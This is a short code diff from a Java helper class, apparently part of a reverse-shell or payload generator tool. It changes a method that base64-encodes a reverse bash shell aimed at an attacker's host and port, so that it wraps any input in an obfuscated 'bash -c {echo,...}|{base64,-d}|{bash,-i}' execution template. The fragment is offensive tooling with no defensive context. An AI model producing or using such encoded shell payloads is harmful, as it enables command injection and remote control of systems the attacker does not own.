@@ -28,17 +28,16 @@ public class enCodeUtls {
         return encodedText;
     }
     /**
-     * @param Lhost:
-     * @param Lport:
+     * @param str:
      * @return: java.lang.String
      * @date: 2023/2/9 19:35
      * @description: Java base64编码
      */
-    public static String JavaEncode(String Lhost, String Lport) {
+    public static String JavaEncode(String str) {
 
         String base64EecodeStr = null;
-        base64EecodeStr = Base64.getEncoder().encodeToString(ReverseController.ReverseBash1(Lhost, Lport).getBytes(StandardCharsets.UTF_8));
-        base64EecodeStr = "bash -c {echo," + base64EecodeStr + "}|{base64,-d}|{bash,-i}";
+
+        base64EecodeStr = "bash -c {echo," + str + "}|{base64,-d}|{bash,-i}";
         return base64EecodeStr;
     }
     /**
